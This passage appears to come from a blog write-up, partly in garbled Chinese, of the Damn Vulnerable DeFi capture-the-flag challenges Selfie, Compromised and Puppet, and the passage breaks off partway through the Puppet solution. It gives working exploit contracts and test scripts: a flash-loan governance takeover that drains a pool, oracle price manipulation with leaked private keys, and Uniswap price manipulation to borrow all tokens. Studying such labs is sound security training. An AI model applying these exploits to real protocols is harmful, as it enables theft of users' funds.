class="hljs-comment">/** CODE YOUR EXPLOIT HERE */</span><br>    <span class="hljs-keyword">await</span> ethers.provider.send(<span class="hljs-string">&quot;evm_increaseTime&quot;</span>, [<span class="hljs-number">5</span> * <span class="hljs-number">24</span> * <span class="hljs-number">60</span> * <span class="hljs-number">60</span>]);<br>    <span class="hljs-keyword">const</span> TheRewarderAttacker = <span class="hljs-keyword">await</span>  ethers.getContractFactory(<span class="hljs-string">&#x27;TheRewarderAttacker&#x27;</span>,attacker);<br>    <span class="hljs-keyword">const</span> Attacker = <span class="hljs-keyword">await</span> TheRewarderAttacker.deploy(<span class="hljs-built_in">this</span>.liquidityToken.address, <span class="hljs-built_in">this</span>.rewardToken.address, <span class="hljs-built_in">this</span>.flashLoanPool.address, <span class="hljs-built_in">this</span>.rewarderPool.address);<br>    <span class="hljs-keyword">await</span> Attacker.attack(TOKENS_IN_LENDER_POOL);<br>&#125;);<br></code></pre></td></tr></table></figure><h2 id="Selfie"><a href="#Selfie" class="headerlink" title="Selfie"></a>Selfie</h2><blockquote><p>A new cool lending pool has launched! Itâ€™s now offering flash loans of DVT tokens.</p><p>Wow, and it even includes a really fancy governance mechanism to control it.</p><p>What could go wrong, right ?</p><p>You start with no DVT tokens in balance, and the pool has 1.5 million. Your objective: take them all.</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs solidity">function queueAction(address receiver, bytes calldata data, uint256 weiAmount) external returns (uint256) &#123;<br>    require(_hasEnoughVotes(msg.sender), &quot;Not enough votes to propose an action&quot;);<br>    require(receiver != address(this), &quot;Cannot queue actions that affect Governance&quot;);<br>                                                                                          <br>    uint256 actionId = actionCounter;<br><br>    GovernanceAction storage actionToQueue = actions[actionId];<br>    actionToQueue.receiver = receiver;<br>    actionToQueue.weiAmount = weiAmount;<br>    actionToQueue.data = data;<br>    actionToQueue.proposedAt = block.timestamp;<br><br>    actionCounter++;<br><br>    emit ActionQueued(actionId, msg.sender);<br>    return actionId;<br>&#125;<br><br>function flashLoan(uint256 borrowAmount) external nonReentrant &#123;<br>        uint256 balanceBefore = token.balanceOf(address(this));<br>        require(balanceBefore &gt;= borrowAmount, &quot;Not enough tokens in pool&quot;);<br>        <br>        token.transfer(msg.sender, borrowAmount);        <br>        <br>        require(msg.sender.isContract(), &quot;Sender must be a deployed contract&quot;);<br>        msg.sender.functionCall(<br>            abi.encodeWithSignature(<br>                &quot;receiveTokens(address,uint256)&quot;,<br>                address(token),<br>                borrowAmount<br>            )<br>        );<br>        <br>        uint256 balanceAfter = token.balanceOf(address(this));<br><br>        require(balanceAfter &gt;= balanceBefore, &quot;Flash loan hasn&#x27;t been paid back&quot;);<br>    &#125;<br><br>    function drainAllFunds(address receiver) external onlyGovernance &#123;<br>        uint256 amount = token.balanceOf(address(this));<br>        token.transfer(receiver, amount);<br>        <br>        emit FundsDrained(receiver, amount);<br>    &#125;<br></code></pre></td></tr></table></figure><p><code>drainAllFunds</code> å…è®¸ä»æ± ä¸­è½¬ç§»æ‰€æœ‰ä»£å¸ï¼Œå¹¶å— <code>onlyGovernance</code> ä¿®é¥°ç¬¦çš„ä¿æŠ¤ã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs solidity">pragma solidity ^0.8.0;<br><br>import &quot;../selfie/SimpleGovernance.sol&quot;;<br>import &quot;../selfie/SelfiePool.sol&quot;;<br><br>contract SelfieAttacker &#123;<br>    SimpleGovernance governance;<br>    SelfiePool pool;<br>    address attacker;<br>    uint256 actionId;<br><br>    constructor(SimpleGovernance _governance,SelfiePool _pool) &#123;<br>        governance = _governance;<br>        pool = _pool;<br>        attacker = msg.sender;<br>    &#125;<br><br>    function attack1(uint256 amount) external &#123;<br>        pool.flashLoan(amount);<br>    &#125;<br><br>//åœ¨ç­‰å¾… 2 å¤©åæ‰§è¡Œå®ƒå¹¶æ‰§è¡Œå®ƒä»¥è€—å°½æ‰€æœ‰ä»¤ç‰Œ<br>    function attack2() external &#123;<br>        governance.executeAction(actionId);<br>    &#125;<br><br>    function receiveTokens(address _token,uint256 borrowAmount) external &#123;<br>    //åˆ›å»ºæ²»ç†ä»£å¸çš„å¿«ç…§<br>        DamnValuableTokenSnapshot token = DamnValuableTokenSnapshot(_token);<br>        token.snapshot();<br><br>//æ’é˜Ÿææ¡ˆ<br>        bytes memory data = abi.encodeWithSignature(&quot;drainAllFunds(address)&quot;,attacker);<br>        actionId =governance.queueAction(address(pool),data,0);<br><br>//å½’è¿˜è´·æ¬¾<br>        token.transfer(address(pool),borrowAmount);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs js">it(<span class="hljs-string">&#x27;Exploit&#x27;</span>, <span class="hljs-keyword">async</span> <span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params"></span>) </span>&#123;<br>    <span class="hljs-comment">/** CODE YOUR EXPLOIT HERE */</span><br>    <span class="hljs-keyword">const</span> SelfieAttacker = <span class="hljs-keyword">await</span> ethers.getContractFactory(<span class="hljs-string">&#x27;SelfieAttacker&#x27;</span>,attacker);<br>    <span class="hljs-keyword">const</span> Attack = <span class="hljs-keyword">await</span> SelfieAttacker.deploy(<span class="hljs-built_in">this</span>.governance.address,<span class="hljs-built_in">this</span>.pool.address);<br><br>    <span class="hljs-keyword">await</span> Attack.attack1(TOKENS_IN_POOL);<br>    <span class="hljs-keyword">await</span> ethers.provider.send(<span class="hljs-string">&quot;evm_increaseTime&quot;</span>, [<span class="hljs-number">2</span> * <span class="hljs-number">24</span> * <span class="hljs-number">60</span> * <span class="hljs-number">60</span>]); <span class="hljs-comment">// 2 days</span><br>    <span class="hljs-keyword">await</span> Attack.attack2();<br>&#125;);<br></code></pre></td></tr></table></figure><h2 id="Compromised"><a href="#Compromised" class="headerlink" title="Compromised"></a>Compromised</h2><blockquote><p>While poking around a web service of one of the most popular DeFi projects in the space, you get a somewhat strange response from their server. This is a snippet:</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-meta">HTTP/2</span> <span class="hljs-number">200</span> OK<br><span class="hljs-attribute">content-type</span><span class="hljs-punctuation">: </span>text/html<br><span class="hljs-attribute">content-language</span><span class="hljs-punctuation">: </span>en<br><span class="hljs-attribute">vary</span><span class="hljs-punctuation">: </span>Accept-Encoding<br><span class="hljs-attribute">server</span><span class="hljs-punctuation">: </span>cloudflare<br><br><span class="apache"><span class="hljs-attribute">4d</span> <span class="hljs-number">48</span> <span class="hljs-number">68</span> <span class="hljs-number">6</span>a <span class="hljs-number">4</span>e <span class="hljs-number">6</span>a <span class="hljs-number">63</span> <span class="hljs-number">34</span> <span class="hljs-number">5</span>a <span class="hljs-number">57</span> <span class="hljs-number">59</span> <span class="hljs-number">78</span> <span class="hljs-number">59</span> <span class="hljs-number">57</span> <span class="hljs-number">45</span> <span class="hljs-number">30</span> <span class="hljs-number">4</span>e <span class="hljs-number">54</span> <span class="hljs-number">5</span>a <span class="hljs-number">6</span>b <span class="hljs-number">59</span> <span class="hljs-number">54</span> <span class="hljs-number">59</span> <span class="hljs-number">31</span> <span class="hljs-number">59</span> <span class="hljs-number">7</span>a <span class="hljs-number">5</span>a <span class="hljs-number">6</span>d <span class="hljs-number">59</span> <span class="hljs-number">7</span>a <span class="hljs-number">55</span> <span class="hljs-number">34</span> <span class="hljs-number">4</span>e <span class="hljs-number">6</span>a <span class="hljs-number">46</span> <span class="hljs-number">6</span>b <span class="hljs-number">4</span>e <span class="hljs-number">44</span> <span class="hljs-number">51</span> <span class="hljs-number">34</span> <span class="hljs-number">4</span>f <span class="hljs-number">54</span> <span class="hljs-number">4</span>a <span class="hljs-number">6</span>a <span class="hljs-number">5</span>a <span class="hljs-number">47</span> <span class="hljs-number">5</span>a <span class="hljs-number">68</span> <span class="hljs-number">59</span> <span class="hljs-number">7</span>a <span class="hljs-number">42</span> <span class="hljs-number">6</span>a <span class="hljs-number">4</span>e <span class="hljs-number">6</span>d <span class="hljs-number">4</span>d <span class="hljs-number">34</span> <span class="hljs-number">59</span> <span class="hljs-number">7</span>a <span class="hljs-number">49</span> <span class="hljs-number">31</span> <span class="hljs-number">4</span>e <span class="hljs-number">6</span>a <span class="hljs-number">42</span> <span class="hljs-number">69</span> <span class="hljs-number">5</span>a <span class="hljs-number">6</span>a <span class="hljs-number">42</span> <span class="hljs-number">6</span>a <span class="hljs-number">4</span>f <span class="hljs-number">57</span> <span class="hljs-number">5</span>a <span class="hljs-number">69</span> <span class="hljs-number">59</span> <span class="hljs-number">32</span> <span class="hljs-number">52</span> <span class="hljs-number">68</span> <span class="hljs-number">5</span>a <span class="hljs-number">54</span> <span class="hljs-number">4</span>a <span class="hljs-number">6</span>d <span class="hljs-number">4</span>e <span class="hljs-number">44</span> <span class="hljs-number">63</span> <span class="hljs-number">7</span>a <span class="hljs-number">4</span>e <span class="hljs-number">57</span> <span class="hljs-number">45</span> <span class="hljs-number">35</span></span><br><span class="apache"></span><br><span class="apache"><span class="hljs-attribute">4d</span> <span class="hljs-number">48</span> <span class="hljs-number">67</span> <span class="hljs-number">79</span> <span class="hljs-number">4</span>d <span class="hljs-number">44</span> <span class="hljs-number">67</span> <span class="hljs-number">79</span> <span class="hljs-number">4</span>e <span class="hljs-number">44</span> <span class="hljs-number">4</span>a <span class="hljs-number">6</span>a <span class="hljs-number">4</span>e <span class="hljs-number">44</span> <span class="hljs-number">42</span> <span class="hljs-number">68</span> <span class="hljs-number">59</span> <span class="hljs-number">32</span> <span class="hljs-number">52</span> <span class="hljs-number">6</span>d <span class="hljs-number">59</span> <span class="hljs-number">54</span> <span class="hljs-number">6</span>c <span class="hljs-number">6</span>c <span class="hljs-number">5</span>a <span class="hljs-number">44</span> <span class="hljs-number">67</span> <span class="hljs-number">34</span> <span class="hljs-number">4</span>f <span class="hljs-number">57</span> <span class="hljs-number">55</span> <span class="hljs-number">32</span> <span class="hljs-number">4</span>f <span class="hljs-number">44</span> <span class="hljs-number">56</span> <span class="hljs-number">6</span>a <span class="hljs-number">4</span>d <span class="hljs-number">6</span>a <span class="hljs-number">4</span>d <span class="hljs-number">31</span> <span class="hljs-number">4</span>e <span class="hljs-number">44</span> <span class="hljs-number">64</span> <span class="hljs-number">68</span> <span class="hljs-number">59</span> <span class="hljs-number">32</span> <span class="hljs-number">4</span>a <span class="hljs-number">6</span>c <span class="hljs-number">5</span>a <span class="hljs-number">44</span> <span class="hljs-number">6</span>c <span class="hljs-number">69</span> <span class="hljs-number">5</span>a <span class="hljs-number">57</span> <span class="hljs-number">5</span>a <span class="hljs-number">6</span>a <span class="hljs-number">4</span>e <span class="hljs-number">6</span>a <span class="hljs-number">41</span> <span class="hljs-number">7</span>a <span class="hljs-number">4</span>e <span class="hljs-number">7</span>a <span class="hljs-number">46</span> <span class="hljs-number">6</span>c <span class="hljs-number">4</span>f <span class="hljs-number">54</span> <span class="hljs-number">67</span> <span class="hljs-number">33</span> <span class="hljs-number">4</span>e <span class="hljs-number">57</span> <span class="hljs-number">5</span>a <span class="hljs-number">69</span> <span class="hljs-number">59</span> <span class="hljs-number">32</span> <span class="hljs-number">51</span> <span class="hljs-number">33</span> <span class="hljs-number">4</span>d <span class="hljs-number">7</span>a <span class="hljs-number">59</span> <span class="hljs-number">7</span>a <span class="hljs-number">4</span>e <span class="hljs-number">44</span> <span class="hljs-number">42</span> <span class="hljs-number">69</span> <span class="hljs-number">59</span> <span class="hljs-number">6</span>a <span class="hljs-number">51</span> <span class="hljs-number">34</span></span><br><span class="apache"></span><br></code></pre></td></tr></table></figure><p>A related on-chain exchange is selling (absurdly overpriced) collectibles called â€œDVNFTâ€, now at 999 ETH each</p><p>This price is fetched from an on-chain oracle, and is based on three trusted reporters: <code>0xA73209FB1a42495120166736362A1DfA9F95A105</code>,<code>0xe92401A4d3af5E446d93D11EEc806b1462b39D15</code> and <code>0x81A5D6E50C214044bE44cA0CB057fe119097850c</code>.</p><p>Starting with only 0.1 ETH in balance, you must steal all ETH available in the exchange.</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs solidity">function postPrice(string calldata symbol, uint256 newPrice) external onlyTrustedSource &#123;<br>    _setPrice(msg.sender, symbol, newPrice);<br>&#125;<br><br>    function _computeMedianPrice(string memory symbol) private view returns (uint256) &#123;<br>        uint256[] memory prices = _sort(getAllPricesForSymbol(symbol));<br><br>        // calculate median price<br>        if (prices.length % 2 == 0) &#123;<br>            uint256 leftPrice = prices[(prices.length / 2) - 1];<br>            uint256 rightPrice = prices[prices.length / 2];<br>            return (leftPrice + rightPrice) / 2;<br>        &#125; else &#123;<br>            return prices[prices.length / 2];<br>        &#125;<br>    &#125;<br></code></pre></td></tr></table></figure><p>åªæœ‰onlyTrustedSourceæ‰èƒ½ä¿®æ”¹ä»·æ ¼</p><p>å½“ä»·æ ¼çš„æ•°ç»„çš„é•¿åº¦ä¸ºå¥‡æ•°æ—¶ï¼Œå®ƒå–ä¸­é—´çš„ä¸€ä¸ªå¹¶å°†å…¶ç§°ä¸ºä¸­å€¼ä»·æ ¼ã€‚æˆ‘ä»¬æ°å¥½æœ‰ä¸‰ä¸ªç®¡ç†å‘˜</p><p>åˆ†æé¢˜ç›®ç»™å‡ºçš„æ•°æ®</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs python">data1 = <span class="hljs-string">&quot;4d 48 68 6a 4e 6a 63 34 5a 57 59 78 59 57 45 30 4e 54 5a 6b 59 54 59 31 59 7a 5a 6d 59 7a 55 34 4e 6a 46 6b 4e 44 51 34 4f 54 4a 6a 5a 47 5a 68 59 7a 42 6a 4e 6d 4d 34 59 7a 49 31 4e 6a 42 69 5a 6a 42 6a 4f 57 5a 69 59 32 52 68 5a 54 4a 6d 4e 44 63 7a 4e 57 45 35&quot;</span>;<br>hexdata1 = <span class="hljs-built_in">bytes</span>.fromhex(<span class="hljs-string">&quot;&quot;</span>.join(data1.split())).decode(<span class="hljs-string">&quot;utf-8&quot;</span>)<br>base64data1 = base64.b64decode(hexdata1)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;data1&#x27;</span>)<br><span class="hljs-built_in">print</span>(hexdata1)<br><span class="hljs-built_in">print</span>(base64data1)<br><br>data2 = <span class="hljs-string">&#x27;4d 48 67 79 4d 44 67 79 4e 44 4a 6a 4e 44 42 68 59 32 52 6d 59 54 6c 6c 5a 44 67 34 4f 57 55 32 4f 44 56 6a 4d 6a 4d 31 4e 44 64 68 59 32 4a 6c 5a 44 6c 69 5a 57 5a 6a 4e 6a 41 7a 4e 7a 46 6c 4f 54 67 33 4e 57 5a 69 59 32 51 33 4d 7a 59 7a 4e 44 42 69 59 6a 51 34&#x27;</span><br>hexdata2 = <span class="hljs-built_in">bytes</span>.fromhex(<span class="hljs-string">&quot;&quot;</span>.join(data2.split())).decode(<span class="hljs-string">&quot;utf-8&quot;</span>)<br>base64data2 = base64.b64decode(hexdata2)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;data2&#x27;</span>)<br><span class="hljs-built_in">print</span>(hexdata2)<br><span class="hljs-built_in">print</span>(base64data2)<br></code></pre></td></tr></table></figure><p>å¾—åˆ°ç§é’¥</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python">data1<br>MHhjNjc4ZWYxYWE0NTZkYTY1YzZmYzU4NjFkNDQ4OTJjZGZhYzBjNmM4YzI1NjBiZjBjOWZiY2RhZTJmNDczNWE5<br><span class="hljs-string">b&#x27;0xc678ef1aa456da65c6fc5861d44892cdfac0c6c8c2560bf0c9fbcdae2f4735a9&#x27;</span><br>data2<br>MHgyMDgyNDJjNDBhY2RmYTllZDg4OWU2ODVjMjM1NDdhY2JlZDliZWZjNjAzNzFlOTg3NWZiY2Q3MzYzNDBiYjQ4<br><span class="hljs-string">b&#x27;0x208242c40acdfa9ed889e685c23547acbed9befc60371e9875fbcd736340bb48&#x27;</span><br></code></pre></td></tr></table></figure><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs js">it(<span class="hljs-string">&#x27;Exploit&#x27;</span>, <span class="hljs-keyword">async</span> <span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params"></span>) </span>&#123;        <br>    <span class="hljs-comment">/** CODE YOUR EXPLOIT HERE */</span><br>    <span class="hljs-keyword">let</span> privateKey1 = <span class="hljs-string">&quot;0xc678ef1aa456da65c6fc5861d44892cdfac0c6c8c2560bf0c9fbcdae2f4735a9&quot;</span>;<br>    <span class="hljs-keyword">let</span> privateKey2 = <span class="hljs-string">&quot;0x208242c40acdfa9ed889e685c23547acbed9befc60371e9875fbcd736340bb48&quot;</span>;<br>    <span class="hljs-keyword">let</span> compromisedOracle1 = <span class="hljs-keyword">new</span> ethers.Wallet(privateKey1, ethers.provider);<br>    <span class="hljs-keyword">let</span> compromisedOracle2 = <span class="hljs-keyword">new</span> ethers.Wallet(privateKey2, ethers.provider);<br><br>    <span class="hljs-comment">//ä¿®æ”¹ä¸ºæœ€ä½ä»·</span><br>    <span class="hljs-keyword">await</span> <span class="hljs-built_in">this</span>.oracle.connect(compromisedOracle1).postPrice(<span class="hljs-string">&quot;DVNFT&quot;</span>,<span class="hljs-number">1</span>);<br>    <span class="hljs-keyword">await</span> <span class="hljs-built_in">this</span>.oracle.connect(compromisedOracle2).postPrice(<span class="hljs-string">&quot;DVNFT&quot;</span>,<span class="hljs-number">1</span>);<br><br>    <span class="hljs-comment">//ä¹°å…¥</span><br>    <span class="hljs-keyword">await</span> <span class="hljs-built_in">this</span>.exchange.connect(attacker).buyOne(&#123;<span class="hljs-attr">value</span>:<span class="hljs-number">1</span>&#125;);<br><br>    <span class="hljs-comment">//ä¿®æ”¹ä¸ºæœ€é«˜ä»·</span><br>    <span class="hljs-keyword">await</span> <span class="hljs-built_in">this</span>.oracle.connect(compromisedOracle1).postPrice(<span class="hljs-string">&quot;DVNFT&quot;</span>,EXCHANGE_INITIAL_ETH_BALANCE.add(<span class="hljs-number">1</span>));<br>    <span class="hljs-keyword">await</span> <span class="hljs-built_in">this</span>.oracle.connect(compromisedOracle2).postPrice(<span class="hljs-string">&quot;DVNFT&quot;</span>,EXCHANGE_INITIAL_ETH_BALANCE.add(<span class="hljs-number">1</span>));<br><br>    <span class="hljs-comment">//å–å‡º</span><br>    <span class="hljs-keyword">await</span> <span class="hljs-built_in">this</span>.nftToken.connect(attacker).approve(<span class="hljs-built_in">this</span>.exchange.address, <span class="hljs-number">0</span>);<br>    <span class="hljs-keyword">await</span> <span class="hljs-built_in">this</span>.exchange.connect(attacker).sellOne(<span class="hljs-number">0</span>);<br><br>    <span class="hljs-comment">//ä¿®æ”¹ä¸ºåŸå§‹ä»·æ ¼</span><br>    <span class="hljs-keyword">await</span> <span class="hljs-built_in">this</span>.oracle.connect(compromisedOracle1).postPrice(<span class="hljs-string">&quot;DVNFT&quot;</span>,INITIAL_NFT_PRICE);<br>    <span class="hljs-keyword">await</span> <span class="hljs-built_in">this</span>.oracle.connect(compromisedOracle2).postPrice(<span class="hljs-string">&quot;DVNFT&quot;</span>,INITIAL_NFT_PRICE);<br>&#125;);<br></code></pre></td></tr></table></figure><h2 id="Puppet"><a href="#Puppet" class="headerlink" title="Puppet"></a>Puppet</h2><blockquote><p>Thereâ€™s a huge lending pool borrowing Damn Valuable Tokens (DVTs), where you first need to deposit twice the borrow amount in ETH as collateral. The pool currently has 100000 DVTs in liquidity.</p><p>Thereâ€™s a DVT market opened in an <a href="https://docs.uniswap.org/protocol/V1/introduction">Uniswap v1 exchange</a>, currently with 10 ETH and 10 DVT in liquidity.</p><p>Starting with 25 ETH and 1000 DVTs in balance, you must steal all tokens from the lending pool.</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs solidity">function borrow(uint256 borrowAmount) public payable nonReentrant &#123;<br>        uint256 depositRequired = calculateDepositRequired(borrowAmount);<br>        <br>        require(msg.value &gt;= depositRequired, &quot;Not depositing enough collateral&quot;);<br>        <br>        if (msg.value &gt; depositRequired) &#123;<br>            payable(msg.sender).sendValue(msg.value - depositRequired);<br>        &#125;<br><br>        deposits[msg.sender] = deposits[msg.sender] + depositRequired;<br><br>        // Fails if the pool doesn&#x27;t have enough tokens in liquidity<br>        require(token.transfer(msg.sender, borrowAmount), &quot;Transfer failed&quot;);<br><br>        emit Borrowed(msg.sender, depositRequired, borrowAmount);<br>    &#125;<br><br>function _computeOraclePrice() private view returns (uint256) &#123;<br>    // calculates the price of the token in wei according to Uniswap pair<br>    return uniswapPair.balance * (10 ** 18) / token.balanceOf(uniswapPair);<br>&#125;<br></code></pre></td></tr></table></figure><p>é€šè¿‡æ”¹å˜ uniswap äº¤æ˜“å¯¹ä¸­çš„ ether å’Œ DVT çš„ä½™é¢ï¼Œæˆ‘ä»¬å¯ä»¥æ“çºµä»·æ ¼ï¼Œä»è€Œæ“çºµä» PuppetPool å€Ÿå…¥ä»£å¸æ‰€éœ€çš„æŠµæŠ¼å“æ•°é‡ã€‚æˆ‘ä»¬å¸Œæœ›æ‰€æœ‰ DVT çš„ä»¥å¤ªå¸æŠµæŠ¼å“å°½å¯èƒ½å°‘ï¼Œä¸ºæ­¤æˆ‘ä»¬é¦–å…ˆå¿…é¡»å¼•å‘ä»·æ ¼æš´è·Œã€‚ä¸ºæ­¤ï¼Œæˆ‘ä»¬éœ€è¦å‡å°‘ uniswap å¯¹çš„ä»¥å¤ªå¸ä½™é¢å¹¶å°½å¯èƒ½å¢åŠ  DVT ä»£å¸ä½™é¢ã€‚</p><p>å¯ä»¥å€ŸåŠ©<a href="https://github.com/tinchoabbate/damn-vulnerable-defi/blob/v2.0.0/build-uniswap-v1/UniswapV1Exchange.json">UniswapV1Exchange.json</a>ä¸­çš„ <code>tokenToEthSwapInput</code> å‡½æ•°</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs js">&#123;<br>  <span class="hljs-string">&quot;name&quot;</span>: <span class="hljs-string">&quot;tokenToEthSwapInput&quot;</span>,<br>  <span class="hljs-string">&quot;outputs&quot;</span>: [&#123; <span class="hljs-string">&quot;type&quot;</span>: <span class="hljs-string">&quot;uint256&quot;</span>, <span class="hljs-string">&quot;name&quot;</span>: <span class="hljs-string">&quot;out&quot;</span> &#125;],<br>  <span class="hljs-string">&quot;inputs&quot;</span>: [<br>    &#123; <span class="hljs-string">&quot;type&quot;</span>: <span class="hljs-string">&quot;uint256&quot;</span>, <span class="hljs-string">&quot;name&quot;</span>: <span class="hljs-string">&quot;tokens_sold&quot;</span> &#125;,<br>    &#123; <span class="hljs-string">&quot;type&quot;</span>: <span class="hljs-string">&quot;uint256&quot;</span>, <span class="hljs-string">&quot;name&quot;</span>: <span class="hljs-string">&quot;min_eth&quot;</span> &#125;,<br>    &#123; <span class="hljs-string">&quot;type&quot;</span>: <span class="hljs-string">&quot;uint256&quot;</span>, <span class="hljs-string">&quot;name&quot;</span>: <span class="hljs-string">&quot;deadline&quot;</span> &#125;<br>  ],<br>  <span class="hljs-string">&quot;constant&quot;</span>: <span class="hljs-literal">false</span>,<br>  <span class="hljs-string">&quot;payable&quot;</span>: <span class="hljs-literal">false</span>,<br>  <span class="hljs-string">&quot;type&quot;</span>: <span class="hljs-string">&quot;function&quot;</span>,<br>  <span class="hljs-string">&quot;gas&quot;</span>: <span class="hljs-number">47503</span><br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs js">it(<span class="hljs-string">&#x27;Exploit&#x27;</span>, <span class="hljs-keyword">async</span> <span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params"></span>) </span>&#123;<br>    <span class="hljs-comment">/** CODE YOUR EXPLOIT HERE */</span><br>    <span class="hljs-keyword">await</span> <span class="hljs-built_in">this</span>.token.connect(attacker).approve(<span class="hljs-built_in">this</span>.uniswapExchange.address,ATTACKER_INITIAL_TOKEN_BALANCE);<br><br>    <span class="hljs-comment">//å°†è‡ªå·±çš„DVTæ¢æˆuniswapæ± ä¸­çš„ETH(ä¸èƒ½æ¢å®Œ)</span><br>    <span class="hljs-keyword">await</span> <span class="hljs-built_in">this</span>.uniswapExchange.connect(attacker).tokenToEthSwapInput(ATTACKER_INITIAL_TOKEN_BALANCE.sub(<span class="hljs-number">1</span>),<span class="hljs-number">1</span>,(<span class="hljs-keyword">await</span> ethers.provider.getBlock(<span class="hljs-string">&#x27;latest&#x27;</span>)).timestamp * <span class="hljs-number">2</span>);<br><br>    <span class="hljs-keyword">const</span> collateral = <span class="hljs-keyword">await</span> <span class="hljs-built_in">this</span>.lendingPool.calculateDepositRequired(POOL_INITIAL_TOKEN_BALANCE);<br>    <span class="hljs-keyword">await</span> <span class="hljs-built_in">this</span>.lendingPool.connect(attacker).borrow(POOL_INITIAL_TOKEN_BALANCE,&#123;<span 